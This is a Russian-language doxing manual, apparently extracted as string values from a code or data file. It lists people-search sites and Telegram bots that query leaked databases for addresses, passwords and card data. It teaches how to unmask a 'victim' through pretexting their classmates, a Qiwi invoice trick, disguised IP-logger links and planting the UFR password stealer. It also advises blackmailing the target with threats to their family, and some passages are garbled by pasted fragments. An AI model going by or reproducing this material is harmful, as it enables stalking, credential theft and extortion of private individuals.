развитым функционалом, постоянно добавляет новые сервисы.\nhttps://fira.ru/ – молодой быстроразвивающийся проект, располагает полной и оперативной базой данных предприятий, организаций и регионов. Имеет конкурентные цены.\nwww.skrin.ru – портал информации об эмитентах ценных бумаг. Наряду с обязательной информацией об эмитентах содержит базы обзоров предприятий, отраслей, отчетность по стандартам РБУ, ГААП, ИАС. ЗАО “СКРИН” является организацией, уполномоченной ФСФР.\nhttp://www.magelan.pro/ – портал по тендерам, электронным аукционам и коммерческим закупкам. Включает в себя качественный поисковик по данной предметной сфере.\nhttp://www.kontragent.info/ – ресурс предоставляет информацию о реквизитах контрагентов и реквизитах, соответствующих ведению бизнеса.\nhttp://www.ist-budget.ru/ – веб-сервис по всем тендерам, госзаказам и госзакупкам России. Включает бесплатный поисковик по полной базе тендеров, а также недорогой платный сервис, включающий поиск с использованием расширенных фильтров, по тематическим каталогам. Кроме того, пользователи портала могут получать аналитические отчеты по заказчикам и поставщикам по тендерам. Есть и система прогнозирования возможных победителей тендеров.\nhttp://www.vuve.su/ - портал информации об организациях, предприятиях и компаниях, ведущих свою деятельность в России и на территории СНГ. На сегодняшний день база портала содержит сведения о более чем 1 млн. организаций.\nhttp://www.disclosure.ru/index.shtml - система раскрытия информации на рынке ценных бумаг Российской Федерации. Включает отчетность эмитентов, существенные новости, отраслевые обзоры и анализ тенденций.\nhttp://www.mosstat.ru/index.html – бесплатные и платные онлайн базы данных и сервисы по ЕГРПО и ЕГРЮЛ Москвы и России, а также бухгалтерские балансы с 2005 года по настоящее время. По платным базам самые низкие тарифы в Рунете. Хорошая навигация, удобная оплата, качественная и оперативная работа.\nhttp://www.torg94.ru/ – качественный оперативный и полезный ресурс по госзакупкам, электронным торгам и госзаказам.\nhttp://www.k-agent.ru/ – база данных «Контрагент». Состоит из карточек компаний, связанных с ними документов, списков аффилированных лиц и годовых бухгалтерских отчетов. Документы по компаниям представлены с 2006 г. Цена в месяц 900 руб. Запрашивать данные можно на сколь угодно много компаний.\nhttp://www.is-zakupki.ru/ – информационная система государственных и коммерческих закупок. В системе собрана наиболее полная информация по государственным, муниципальным и коммерческим закупкам по всей территории РФ. Очень удобна в работе, имеет много дополнительных сервисов и, что приятно, абсолютно разумные, доступные даже для малого бизнеса цены.\nhttp://salespring.ru/ – открытая пополняемая база данных деловых контактов предприятий России и СНГ и их сотрудников. Функционирует как своеобразная биржа контактов.\nwww.multistat.ru – многофункциональный статистический портал. Официальный портал ГМЦ Росстата.\nhttp://sanstv.ru/photomap/ (поиск фото по геометкам в соц. сетях)\nКарта движения судов в реальном времени: https://www.marinetraffic.com\nКарта движения судов в реальном времени: https://seatracker.ru/ais.php\nКарта движения судов: http://shipfinder.co/\nОтслеживание самолетов: https://planefinder.net/\nОтслеживание самолетов: https://www.radarbox24.com/\nОтслеживание самолетов: https://de.flightaware.com/\nОтслеживание самолетов: https://www.flightradar24.com\n\nОбщий поиск по соц. сетям, большой набор разных инструментов для поиска:\n- http://osintframework.com/\nhttps://findclone.ru/- Лучшая доступная технология распознавания лиц (документация)\n\nПоиск местоположения базовой станции сотового оператора:\n- http://unwiredlabs.com\n- http://xinit.ru/bs/\n\nhttps://www.reestr-zalogov.ru/search/index - Реестр уведомлений о залоге движимого имущества\nhttps://мвд.рф/wanted - Внимание, розыск! можно порофлить тут или кинуть еблет жертвы в подслушку города хаххахахахахахахха\nhttps://www.mos.ru/karta-moskvicha/services-proverka-grazhdanina-v-reestre-studentov/ - Проверка гражданина в реестре студентов/ординаторов/аспирантов (держатели карты москвича)\nhttp://esugi.rosim.ru - Реестр федерального имущества Российской Федерации\npd.rkn.gov.ru/operators-registry - Реестр операторов, осуществляющих обработку персональных данных\nbankrot.fedresurs.ru - Единый федеральный реестр сведений о банкротстве.\n==================================================================================================================================================== \n▫️ Lampyre (https://account.lampyre.io/email-and-phone-lookup) — веб версия поиска по любому номеру телефона, поиск по почте\n▫️ Getcontact (https://getcontact.com/) — найдет информацию о том как записан номер в контактах\n▫️ Truecaller (https://www.truecaller.com/) — телефонная книга, найдет имя и оператора телефона\n▫️ Bullshit (https://mirror.bullshit.agency/) — поиск объявлений по номеру телефона\n▫️ Bases-brothers (https://bases-brothers.ru/) — поиск номера в объявлениях\n▫️ Microsoft (http://account.live.com/) — проверка привязанности номера к microsoft аккаунту\n▫️ Avinfo.guru (https://avinfo.guru/) — проверка телефона владельца авто, иногда нужен VPN\n▫️ Telefon.stop-list (http://telefon.stop-list.info/) — поиск по всем фронтам, иногда нет информации\n▫️ @numberPhoneBot (https://t.me/@numberPhoneBot) — найдет адрес и ФИО, не всегда находит\n▫️ Rosfirm (https://gutelu.rosfirm.info/) — найдет ФИО, адрес прописки и дату рождения, нужно знать город\n▫️ Spravnik (https://spravnik.com/) — поиск по городскому номеру телефона, найдет ФИО и адрес\n▫️ @usersbox_bot (https://t.me/@usersbox_bot) — бот найдет аккаунты в ВК у которых в поле номера телефона указан искомый номер\n▫️ Spiderfoot (https://www.spiderfoot.net/) — автоматический поиск с использованием огромного количества методов, ножно использовать в облаке если пройти регистрацию\n▫️ Locatefamily (https://www.locatefamily.com/) — поиск адреса и ФИО\n▫️ Nuga — поиск instagram\n▫️ Live.com (http://account.live.com/) — Проверка привязки к майкрософт\n▫️ Telefon (http://telefon.stop-list.info/) — Поиск по всем фронтам\n▫️ @FindNameVk_bot (https://t.me/@FindNameVk_bot) — Бот ищет историю смены фамилий профиля по открытым источникам, указывает дату создания аккаунта.\n▫️ @InfoVkUser_bot (https://t.me/@InfoVkUser_bot) — Бот позволяет провести анализ друзей профиля.\n==================================================================================================================================================== \n\n1. https://regvk.com - узнать цифровой ID человека ВКонтакте.\n2. https://rusfinder.pro/vk/user/id********* (здесь цифровой ID) - узнать данные указанные при регистрации аккаунта ВКонтакте.\nЕсли ничего старого нет, обновите страницу и быстро делайте скрин области. С новорегами не работает.\n3. http://archive.fo - просмотреть web-архив страницы. Редко помогает.\n4. https://220vk.com - посмотреть скрытых друзей пользователя ВКонтакте. Работает только со старыми страницами, закрытые профили не чекает.\n5. Ошибка <h1>503 Bad Gateway</h1> на DonatePay/DonationAlerts.\nЕсли пользователь использует донат-сервисы, вы можете попытаться узнать его номер сделав ошибку через просмотр кода элемента на странице оплаты. Работает по сей день.\n6. https://zhuteli.rosfirm.info - одна из баз данных адресов. Многих городов нет, ищем по районному центру.\n7. https://nomer.org - одна из баз данных адресов. Есть множество городов, поиск только по фамилии.\n8. https://spravochnik-sng.com - база данных адресов, телефонов, а также сервис по установлению родственных связей.\n9. https://mirror.bullshit.agency - сервис пробива адресов по номеру телефона, указанному на Авито. Работает в 70% случаев.\n10. https://phoneradar.ru - узнать город по номеру телефона.\nЕсли не удается найти адрес, можно узнать хотя бы город/районный центр и сузить круг поисков.\n11. Приложение VKInfo или Group боты - позволяют узнать созданные группы на странице, отсеять старые никнеймы.\n12. https://lampyre.io - узнать страницы социальных сетей и пароли по номеру телефона или почте. Доступно 4 пробива на 1 аккаунт.\nАбузим с помощью http://temp-mail.org. Помимо веб-сервиса, доступна программа с расширенным функционалом (например поиск билетов Аэрофлота).\nПозволяет строить графики.\n13. https://www.maltego.com - расширенный аналог Lampyre. Не веб-сервис, софт. Чтобы скачать, опускаемся вниз сайта.\nПосле установки, выбираем функционал Maltego CE. Позволяет строить графики.\n14. https://www.palantir.com - данные о западных организациях.\nПодойдет для деанонимизаций родственников пользователя из ближней Европы (Латвия, Литва, Польша, Финляндия, Эстония). Позволяет строить графики.\n15. https://vk.watch - помогает узнать, как выглядела страница ВКонтакте за разные промежутки времени. Подписка стоит 3,6 евро.\n16. https://ytch.ru/  - помогает узнать историю изменений на канале YouTube.\n17. Telegram @mailsearchbot - помогает узнать пароли жертвы по номеру телефона, почте, никнейму. Без подписки показывает неполностью, но подобрать можно.\n18. Telegram @EyeGodsBot - помогает узнать привязки, а также имеет эксклюзивную функцию поиска по фото всего за 5 рублей по подписке.\n19. Telegram @AvinfoBot - помогает узнать владельца автомобиля по госномеру, проверить историю продажи автомобиля, проверить автомобиль на участие в ДТП и многое другое.\n20. Telegram @FindNameVk_bot - позволяет узнать историю изменений имени пользователя в ВК.\n==================================================================================================================================================== \nСписок способов поиска в социальных сетях. Некоторые связки.\n\n1. Имя (без фамилии) + город (районный центр/поселок/село) + дата рождения (число).\n2. ИФ + город (путем отсеивания результатов).\n3. Город (районный центр) + полная дата рождения.\n4. Поиск родственников по фамилии (если известен возраст, в фильтрах ставим возраст ОТ по арифметической формуле 18+{полный возраст жертвы}), далее поиск в друзьях странных имен, ников (если не удается найти старые страницы по настоящим данным).\n5. Идентификатор канала на YouTube в Google (позволяет узнать старое название канала).\n==================================================================================================================================================== \nБоты черных рынков:\n@Darksalebot\n@SafeSocks_Bot\n@flood_sms_bot\n==================================================================================================================================================== \n@GetGmail_bot - Полезнейший инструмент, способный узнать ФИ по почте Gmail\npsbdmp.ws - Поиск в текстах pastebin\nГайд по забугор доксингу - https://doxbin.org/upload/doxingguide\n\nintext:(любые данные) - например url вконтакте и находит полную информацию о человеке, ибо все сайты лайкеры и остальные сайты\nсохраняют информацию о человекею.\nПример:\nintext:jfsjjsdlskdkfjd - писать в гугле и вылезут все данные.\n==================================================================================================================================================== \n\n\n',
            "Деанон 4": 'Сайты, которые могут вам очень сильно пригодиться\nhttps://rulait.github.io/vk-friends-saver/ http://archive.is/ http://peeep.us/ https://archive.org/ http://www.cachedpages.com/ http://skyperesolver.net/ https://yip.su https://vedbex.com/tools/iplogger http://phoneradar.ru/phone/ http://afto.lol/ http://zaprosbaza.pw/ https://radaris.ru/ https://service.nalog.ru/inn.html http://services.fms.gov.ru/info-service.htm?sid=2000 https://2ch.hk/b/ http://sonetel.com/ http://psi-im.org/ https://discordapp.com/ http://viber.com/ http://www.vpnbook.com/ https://www.vpnkeys.com/ https://www.tcpvpn.com/ https://prostovpn.org/ https://lightvpn.pro/ http://spys.ru/ https://insorg.org http://sockshub.net/ http://www.cekpr.com/decode-short-url/ https://temp-mail.org/ https://perfectmoney.is/ https://blockchain.info/ https://blackbiz.ws/ https://darkwebs.cc/ https://zblock.co/ https://newage-bank.com/ http://upbitcoin.com/ http://tomygame.com/ https://freebitco.in/ http://gr8.cc/\n\n1. Узнаем id жертвы. Как же это сделать? Заходим в телеграмм, кидаем ссылку боту на жертву, он вам показывает информацию на странице и настоящий id\n\n2. Ник жертвы, узнаем его. Чаще всего он бывает связан с айди.\nВбиваем в яндекс (пример) intext:kykyzlagrief, находим нужную информацию, записываем ее. Желательно найти олдовый ник, и только его вбивать.\n\n3.Чтобы узнать владельца номера и вообще аренда это или нет, нам нужно: Прозвонить на номер телефона, достаточно буквально двух гудков, чтобы понять, что номер настоящий. Далее, добавляем этот номер к себе в контакты на телефоне, позже идём в такие сервисы, как: Instagram, VK, Facebook, Skype, Viber, Whatsapp, Одноклассники. Чтобы найти кому принадлежит инста, вк, фейсбук, одноклассника - нажимаем "Найти Друзей", "Через контакты". А в Скайпе достаточно просто вбить номер в поиск. В Ватсапе и в Вайбере нужно создать новый диалог или добавить его Суть данного способа токова, жертва не может помнить ВСЕ свои социальные сети и обычного оставляет все свою инфу в них. Недавно нашел способ, который захотел добавить сюда, он рил годный. Вобщем, если у нашего человека Теле2, то это наша победа! Заходим на tele2.ru пытаемся войти в личный кабинет и нам само выдаст всю инфу.\n\n4. По тем способам вы возможно нашли ф.и вашей жертвы и ее город. Заходим в поиск, вбиваем И.Ф, город. Нам выдает возможно старые страницы данного человека, там мы находим возможно его школу, лицо, одноклассников, а так же родных и близких ему людей.\n\n5. Если человек не достаточно анонимен, вы можете просмотреть его друзей, там вы найдете возможно не плохую информацию, берете и пишете друзьям, якобы распрашиваем информацию всякую, в какой школе учиться, твой ли это одноклассник, и т.д.\nТак же можем спросить у них номер телефона, как же это можно сделать? Говорим его одноклассникам ,, привет, дай телефон ( и.ф человека). Просто у меня новый телефон, и я всех записываю. Возможно, этот одноклассник даст вам номер телефона.\n\n6. Заходим в гугл, пишем олдовый ник жертвы. Там же можно найти канал, всякую херню. Заходим на его канал, чекаем старые ролики, описание, так же в информаций канала часто много чего написано.\n\n7. Обычно жертва тупая, и оставляет в подписчиках всех своих друзей из жизни, либо наобарот. Для вас, это может быть огромным плюсом.\n\n8. Мы смогли найти соц.сети, именно они нам и нужны. Все ссылки мы должны вбить в браузер и прочекать, где он светился. \n\n9. Найти страницу по никам. Скорее всего по прошлым пунктам, вы смогли найти его старые псевдонимы, их к каждому из них нам необходимо подставить vk.com, тоесть попробовать найти старые страницы через эти ники, чаще всего они попадаются.\n\n10. Всегда сомневайтесь в найденной инфе. Не стоит сразу верить тому, что вы смогли найти. Лучше всегда перепроверять, искать любые док-ва на инфу. Если на горизонте появляется его старые закадычные друзья, который типо знают инфу на него, то тоже нельзя верить, попытайтесь выпросить любые пруфы на валидность, если после этого он сливается - вас хотели наебать и з\n\nError 404 (Not Found)!!1\npeeep.us\nапутать, но вы учли это. Также никогда не\nверьте одному браузеру и Яндекс Людям, они могут не показывать инфу, которая присутствует в интернете, интернет-поисковики - тоже не всевидящее око. Чтобы найти всю инфу, стоит посмотреть информацию в каждой соц.сети отдельно. 11. Социальная Инженерия. В моей практике встречались жертва, которые были уже слишком анонимные и даже я не мог отыскать инфу на них, тогда в ход шла социальная инженерия. Что это из себя представляет? Простые действия, с помощью которых вы постепенно узнаёте инфу о нашем анониме. Вы должны сдружиться или подлизываться к нем, по нимногу узнаваю информацию о нем в своих целях. Главное чтобы он ничего не заподозрил 12. Узнаем точно место жительство (Улица, дом, квартира). Надеюсь вы смогли найти имена родителей с помощью прошлых пунктов, так сразу же преступим к делу. Вы должны найти абсолютно любую базу стационарных телефонов РФ/УК, она нам нужна для вычисления нужной инфы. В поиске мы должны вбить точное имя матери или отца, и нам должно показать всю нужную инфу (т.е стационарный телефон, ФИО, точное место жительства). — http://telkniga.com \n	\n13.Дальше заходим в приложение под названием ClownFish, фотки, которые мы нашли на странице закидываем туда, нам показывают много прочих фотографих и соц сети где они были они найдены.\n\n14. По тем способом вы возможно нашли родных. Так вы можете запугать личность, что якобы вы напишите ей, все расскажите, и обьясните, ведь деанониминизаруют личность не просто так, а за какую то вину. Тем самым вы можете написать ему херню по типу ,, я тебе пишу текст с извинениями - ты копируешь и кидаешь мне, а я не пишу твоей матери. Или же когда вы нашли всю информацию, запугать так же, что если не извенишься то солью ее.\n\n15. По 5 способу, как я и говорил, если одноклассник даст вам номер телефона жертвы таким образом вы можете проверить точность найденной информаций. Заходим опять же в бот в то глаз бога(желтая аватарка такая) и пишем туда номер телефона, если у вас есть деньги просто оформляете там подписку и кидаете туда страницу, возможно вам выдаст номер привязанный к ней.\nЕсли номер не совпадает или виртуальный, бывают очень тупые жертвы, которые не делают себе ник неймы по нику, либо же по виртуальному номеру. У некоторых людей, бывают группы по дизайну, или по чему либо, вы просто заказыааете у них товар, он вам дает киви или номер карты( если номер карты то вы можете радоваться, ибо спокойно по карте, вы можете пробить ф.и.о. человека, номер, родителей, прочую херню) если киви, то вы можете радоваться, проверяем это все, и записываем в информацию.\nkody.su здесь вы можете вбить номер/номера, и посмотреть города и т.д, где будет больше городов в номерах те и будут.\n\n16. Жертва бывает слишком тупая, и ранее оставляет в группах своим имена, фамилий, всякие олд никнеймы, и прочую херню, даже номер телефона. Заходим в сайт infoapp.ru, там вы можете просмотреть все сообщества. Для подтверждения информаций, сделайте так во всех страницах, возможно найдете что то годное.\n\n17. Стиллер. Можно подкинуть жертве стиллер, сейчас всё объясню. Качаем UFR стиллер ,далее смотрим этот ролик(Обучение по этому стиллеру) - https://www.youtube.com/watch?v=TH13XPix3kQ Коротко о стиллере - ворует пароли с браузеров ,танчиков,с filezilla и тд. Например чувак сохранил свой пароль от вк в Chrome ,берём его логин и пароль и считай весь деанон готов тк. в вк он 100% говорил свою инфу ,при этом ещё можно бабла срубить. Можно спиздить каналы YT ,пар\n\nоль (пароли) киви кошельков и тд. . 15. Узнаем номер по Qiwi-Копилке. Для этого метода нам понадобятся: Интернет > Телефон > Мобильное приложение киви. Заходим по ссылке для оплаты на киви копилку, далее выставляем счет, на абсолютно любую сумму, но не заканчиваем оплату. Далее заходим в мобильное приложение и там нам высвечивается номер нашей жертвы! Если номер не показался, то следует зайти в неоплаченные счета и чекнуть самостоятельно. UPD: Помните, полностью анонимных личностей не существует, задеанонить можно\nабсолютно любого. Другое дело, что к каждому пользователю требуется индивидуальный подход, так как у каждого человека\nразные дыры в анонимности и вам предстоит найти их.\n\n18. Заходим на сайт iplogger.ru, этот сайт очень классный, берете кидаете туда ссылку на канал, группу, на любую инфу, дальше вы должны создать точно такую же провдаподобную ссылку как в вк, когда он открывает, его перекидывает на информацию, которую вы кинули, и он даже не подозревает того, что вы вычисляете его по айпи.\n\n19. Пробиваем ютуб канал (если имеется) - Заходим на главную страницу канала , например на этот канал https://www.youtube.com/channel/UCzrZzIOujqD8WOVRQmyz.. Копируем символы после солова channel/ , тоесть копируем вот это UCzrZzIOujqD8WOVRQmyzTiw и видим: на каких каналах он был спонсором ,на каких каналах он пиарился ,где был или есть в саббоксе. Идём к каналу где он был спонсором ,связываемся с владельцем и расспрашиваем о нашей жертве ,нам могут выдать номер ,что можно сделать с номером смотрите выше.\n\n[~]reg.ru - поиск информации по сайту.\n[~]Grabify.link - айпи логгер\n[~]Clck.ru - второй айпи логгер\n[~]@reverseSearch2Bot - находит соц сети по фото\n[~]@EyeGodsBot - находит инфу по айпи номеру лицу и тд.\n[~]@Smart_SearchBot - второй бот по нахождению инфы\n[~]FTH.SU? - Поиск информации по никнейму/IP/Почте.\n[~]220vk.com - Просмотр информации о друзьях, странице и т.д.\n[~]Findclone.ru - Нахождение страниц по фотографиям.\n[~]nomer.io ? - Просмотр информации по номеру телефона.\n[~]CheckHost.net? - Просмотр информация по IP-адресу.\n[~]NotePad++ - Текстовый редактор для записи найденной информации.\n[~]phoneradar.ru - Аналог nomer.io.\n[~]GetContact - Программа для определения ФИО по номеру телефона.\n[~]archive.is - Сохранение страницы.\n[~]vk.com/app7183114_-147591239 - Просмотр информации о странице.\n[~]Leakcheck - Проверка паролей от почт.\n[~]yzad.ru — Находит владельца группы\n[~]vkdia.com — Определит с кем из друзей переписывается человек\n[~]searchlikes.ru — Найдет где есть лайки и комментарии, дает статистику друзей\n[~]tutnaidut.com — информация о аккаунте за несколько лет назад\n[~]flightradar24.com - база данных о полетах по всему миру\n[~]vkbarkov.com - пробив страницы ВКонтакте\n[~]anonymousmask.com - сайт для взлома\n[~]@bagosi - бот вк\n[~] Archive.org - просмотр удаленой информации\n[~]Archive.is - просмотр сохраненой информации в интернете\n[~]VAK-SMS.COM - сайт с виртуальнвми номерами\n[~]5sim.net - сайт с виртуальными номерами\n[~]7sim.net - сайт с виртуальными номерами\n[Ссылка]\nКороткий URL для всех!\nhttp://Clck.ru\n▫ Locatefamily\n(https://www.locatefamily.com/) — найдет ▫ Infobel (https://www.infobel.com/fr/world) — найдет номер телефона, адрес и ФИО\n▫ Rocketreach (http://rocketreach.co/) — поиск людей в linkedIn, Facebook и на других сайтах, находит email\n▫ https://t.me/@egrul_bot — найдет ИП и компании\n▫ Яндекс.Люди (https://yandex.ru/people) — поиск по социальным сетям\n▫ реестр залогов (https://www.reestr-zalogov.ru/state/index) — поиск по залогодателям, даст паспортные данные, место и дату рождения и т.д.\n▫ Zytely (https://zytely.rosfirm.info/) — найдет адрес прописки и дату рождения, необходимо знать город\n▫ Mmnt (http://mmnt.ru/) — найдет упоминания в документах\n▫ Kad.arbitr.ru (http://kad.arbitr.ru/) — дела, рассматриваемые арбитражными судами\n▫ Fedresurs (http://bankrot.fedresurs.ru/?attempt=1) — поиск по банкротам, можно узнать ИНН, СНИЛС и адрес\n▫ Sudact (https://sudact.ru/) — судебные и нормативные акты РФ, поиск по участникам и судам\n▫ Fssprus (http://fssprus.ru/iss/ip/) — проверка задолженностей, для физ. лица\n▫ Notariat (https://data.notariat.ru/directory/succession/search?..) — поиск в реестре наследственных дел, найдет дату смерти человека и адрес нотариуса оформившее дел\n(https://account.lampyre.io/email-and-phone-lookup) — веб версия поиска по любому номеру телефона, поиск по аккаунтам и тел\nРегистратор доменных имён РЕГ.РУ\nwww.reg.ru\nефонной книге\n▫ Getcontact (https://getcontact.com/) — найдет информацию о том как записан номер в контактах\n▫ Truecaller (ht\n[Ссылка]\nLocate Family | Find people for FREE!\nhttps://www.locatefamily.com/\ntps://www.truecaller.com/) — телефонная книга, найдет имя и оператора телефона\n▫ Bullshit (https://mirror.bullshit.agency/) — поиск объявлений по номеру телефона\n▫ Bases-brothers (https://bases-brothers.ru/) — поиск номера в объявлениях\n▫ Microsoft (http://account.live.com/) — проверка привязанности номера к microsoft аккаунту\n▫ Avinfo.guru (https://avinfo.guru/) — проверка телефона владельца авто, иногда нужен VPN\n▫ Telefon.stop-list (http://telefon.stop-list.info/) — поиск по всем фронтам, иногда нет информации\n▫ @numberPhoneBot (https://t.me/@numberPhoneBot) — найдет адрес и ФИО, не всегда находит\n▫ Rosfirm (https://gutelu.rosfirm.info/) — найдет ФИО, адрес прописки и дату рождения, нужно знать город\n\n📱 Поиск по телефону\n\n🤖Боты\n├ @Quick_OSINT_bot — найдет оператора, email, как владелец записан в контактах, базах данных и досках объявлений, аккаунты в соц. сетях и мессенджерах, в каких\nчатах состоит, документы, адреса и многое другое\n├ @clerkinfobot — бот берет данные из приложения getcontact, показывает как записан номер телефона в контактах\n├ @dosie_Bot — как и в боте uabaza дает информацио о паспорте только польностью, 3 бесплатные попытки\n├ @find_caller_bot — найдет ФИО владельца номера телефона\n├ @get_caller_bot — поиск по утечкам персональных данных и записным книгам абонентов, может найти ФИО, дату рождения, e-mail\n├ @get_kolesa_bot — найдет объявления на колеса.кз\n├ @get_kontakt_bot — найдет как записан номер в контактах, дает результаты что и getcontact\n├ @getbank_bot — дает номер карты и полное ФИО клиента банка\n├ @GetFb_bot — бот находит Facebook\n├ @GetPhone_bot — поиск номера телефона в утекших базах\n├ @Getphonetestbot — бот берет данные из приложения getcontact, показывает как записан номер телефона в контактах\n├ @info_baza_bot — поиск в базе данных\n├ @mailsearchbot — найдет часть пароля\n├ @MyGenisBot — найдет имя и фамилию владельца номера\n├ @phone_avito_bot — найдет аккаунт на Авито\n├ @SafeCallsBot — бесплатные анонимные звонки на любой номер телефона с подменой Caller ID\n└ @usersbox_bot — бот найдет аккаунты в ВК у которых в поле номера телефона указан искомый номер\n\n⚙ Ресурсы\n├ lampyre.io — программа выполняет поиск аккаунтов, паролей и многих других данных\n├ avinfo.guru — проверка телефона владельца авто, иногда нужен VPN\n├ fa-fa.kz — найдет ФИО, проверка наличия задолженностей, ИП, и ограничения на выезд\n├ getcontact.com — найдет информацию о том как записан номер в контактах\n├ globfone.com — бесплатные анонимные звонки на любой номер телефона\n├ mirror.bullshit.agency — поиск объявлений по номеру телефона\n├ mysmsbox.ru — определяет чей номер, поиск в Instagram, VK, OK, FB, Twitter, поиск объявлений на Авито, Юла, Из рук в руки, а так же найдет аккаунты в мессенджерах\n├ nuga.app — найдет Instagram аккаунт, авторизация через Google аккаунт и всего 1 попытка\n├ numberway.com — найдет телефонный справочник\n├ personlookup.com.au — найдет имя и адрес\n├ phoneInfoga.crvx.fr — определят тип номера, дает дорки для номера, определяет город\n├ spravnik.com — поиск по городскому номеру телефона, найдет ФИО и адрес\n├ spravochnik109.link — поиск по городскому номеру телефона, найдет ФИО и адрес\n├ teatmik.ee — поиск в базе организаций, ищет номер в контактах\n└ truecaller.com — телефонная книга, найдет имя и оператора телефона\n\n🔨 Восстановление доступа\n├ ICQ — icq.com/password/ru\n├ Yahoo — login.yahoo.com/?display=login\n├ Steam — help.steampowered.com/ru/wizard/HelpWithLoginInfo\n├ Twitter — twitter.com/account/begin_password_reset\n├ VK.com — vk.com/restore\n├ Facebook — facebook.com/login/identify?ctx=recover\n├ Microsoft — account.live.com/acsr\n└ Instagram — instagram.com/accounts/password/reset\n[Ссылка]\nLampyre: Data analysis tool for everyone\nhttp://lampyre.io \n\n1: | vk.watch — Для отката профиля.\n2: ├ lampyre.io — Просмотр привязок на номер/пароли.\n3: ├ nuga.app — Ищем профиль Instagram по номеру телефона.\n4: ├ bago.si / Bagosi InfoApp — Просмотр упоминаний, и администрируемых групп пользователя.\n5: ├ rusfinder.pro — Просмотр изночального профиля.\n6: ├ gutel.rosfirm.info — Адресный справочник городов России\n7: ├ namechk.com/ — Поиск совпадений никнейма.\n8: ├ anonimov.net/ — Узнаем телефон пользователя.\n9: ├ bullshit.agency/search_by_phone — Авито объявления по номеру телефона.\n10: ├ 220vk.com — Действия аккаунты, скрытые друзья.\n11: ├ crashinyou.me — Сайт через который вы сможете по нику/почте/IP игрока узнать все данные о нем, в т.ч. и пароль, следовательно, взломать его.\n\n— Поиск по фото в соцсетях:\n1: ├ search4faces.com\n2: ├ findclone.ru\n3: ├ pimeyes.com/en/\n4: ├ how-old.net/\n',
            "Докс (manual by slizegod lvl 1)": 'Всех приветсвую, это мануал по доксингу 1-ову лвлу от Слайза.\nСвязь - @slizegod\n\nНачнем\n\n\nПрежде всего новичкам тобиж вам нужно понимать что если вы деаноните медийку из комьюнити то с вероятностью 95% у вас ничего не выйдет\nПоэтому начинайте с деанонимизации личностей таких же как и вы тобиж тренироваться и освоить азы доксинга.\n1 лвл доксинга это самое начало, поэтому подкину вам очень полезных сайтов которые вам сильно пригодятся\n\nСначала расмотрим государственные реестры. Это информационные реестры, которые используют люди для поиска своих задолженностей, \nпоиск залогодателей, судебные акты, прописки т.п:\n\nreestr-zalogov.ru — поиск по залогодателям, даст паспортные данные, место и дату рождения и т.д\nzytely.rosfirm.info — найдет адрес прописки и дату рождения, необходимо знать город\nmmnt.ru — найдет упоминания в документах\nkad.arbitr.ru — дела, рассматриваемые арбитражными судами\nbankrot.fedresurs.ru — поиск по банкротам, можно узнать ИНН, СНИЛС и адрес\nsudact.ru — судебные и нормативные акты РФ, поиск по участникам и судам\nspra.vkaru.net — телефонный справочник по России, Украине, Белоруссии, Казахстану, Литве и Молдове\nfssprus.ru— проверка задолженностей, для физ. лица\nfio.stop-list.info — поиск по ИП и судам, если есть ИНН, то можно узнать больше\ngcourts.ru — поиск решений судов общей юрисдикции\nservice.nalog.ru — найдет ИНН, нужно знать полное ФИО, дату рождения и документ удостоверяющий личность\nreestr-dover.ru — поиск в списке сведений об отмене доверенности\nсудебныерешения.рф — найдет судебные решения, документы с ФИО датой и статьей\nnotariat.ru - поиск в реестре наследственных дел, найдет дату смерти человека и адрес нотариуса оформившее дело\nnalog.ru — найдет ИНН, необходимо указать дату рождения и паспортные данные, дату выдачи не обязательно верно.\n\nПоиск по ФИО\nDeanonymizationAnal, не читай ато лох\nDeanonymizationAnal, не читай ато лох 2 апр 2020 в 10:45\n@egrul_bot — найдет ИП и компании\nreestr-zalogov.ru — поиск по залогодателям, даст паспортные данные, место и дату рождения и т.д.\nzytely.rosfirm.info — найдет адрес прописки и дату рождения, необходимо знать город\nmmnt.ru — найдет упоминания в документах\nkad.arbitr.ru — дела, рассматриваемые арбитражными судами\nbankrot.fedresurs.ru — поиск по банкротам, можно узнать ИНН, СНИЛС и адрес\nsudact.ru — судебные и нормативные акты РФ, поиск по участникам и судам\nnomer.center — телефонный справочник, иногда нужен VPN\nspra.vkaru.net — телефонный справочник по России, Украине, Белоруссии, Казахстану, Литве и Молдове\nfssprus.ru — проверка задолженностей, для физ. лица\nfio.stop-list.info — поиск по ИП и судам, если есть ИНН, то можно узнать больше\ngcourts.ru — поиск решений судов общей юрисдикции\nservice.nalog.ru — найдет ИНН, нужно знать полное ФИО, дату рождения и документ удостоверяющий личность\nreestr-dover.ru — поиск в списке сведений об отмене доверенности\nсудебныерешения.рф — найдет судебные решения, документы с ФИО датой и статьей\nnotariat.ru — поиск в реестре наследственных дел, найдет дату смерти человека и адрес нотариуса оформившее дело\n\nCайты для того что-бы найти адрес:\nЕсли какой-то сайт не работает, то заходите через Tor Browser.\nhttps://spravochnikov.ru/\nhttps://spravochnik.city/\nhttps://09online.com/ (самый большой список городов и стран)\nhttp://telkniga.com \nhttps://www.telpoisk.com/\nhttp://ww1.infobaza.org/\nzytely.rosfirm.info — найдет ФИО, адрес прописки и дату рождения, нужно знать город\nhttps://zhityly.rosfirm.info/\nhttps://gytel.rosfirm.info/ — поиск по ФИО и адресу.\nhttps://zhuteli.rosfirm.info - одна из баз данных адресов. Многих городов нет, ищем по районному центру\nhttps://nomer.org — одна из баз данных адресов\nhttps://service.nalog.ru/addrfind.do - Адреса, указанные при государственной регистрации в качестве места нахождения несколькими юридическими лицами\nhttps://spravnik.com/\nhttps://spravka109.ru/spravka - Справочник адресов Украины, России, Казахстана, Беларуси, Латвии, Молдовы.\nhttps://egrul.org/fias/\nhttps://spravochnik-sng.com - база данных адресов, телефонов, а также сервис по установлению родственных связей.\ninfobel.com — найдет номер телефона, адрес и ФИО\nspravochnik109.link — поиск по городскому номеру телефона, найдет ФИО и адрес\n\n\nCайты для Доксинга\nhttps://service.nalog.ru/inn.do – сервис определения ИНН физического лица\nhttp://bankrot.fedresurs.ru/ – единый федеральный реестр сведений о банкротстве\nhttp://egrul.nalog.ru/ – сведения, внесенные в Единый Государственный Реестр Юридических Лиц\nhttps://xn--90adear.xn--p1ai/check/driver/ — проверка водительского удостоверения\nhttp://results.audit.gov.ru/ – портал открытых данных Счетной палаты Российской Федерации.\nhttp://sudact.ru/–  ресурс по судебным и нормативным актам, включающим решения судов общей  юрисдикции, арбитражных судов и мировых судей \nhttp://www.cbr.ru/credit/main.asp –  справочник по кредитным организациям. Сведения ЦБ РФ о банках и кредитных организациях\nhttps://service.nalog.ru/bi.do –  сервис позволяет выяснить, заблокированы 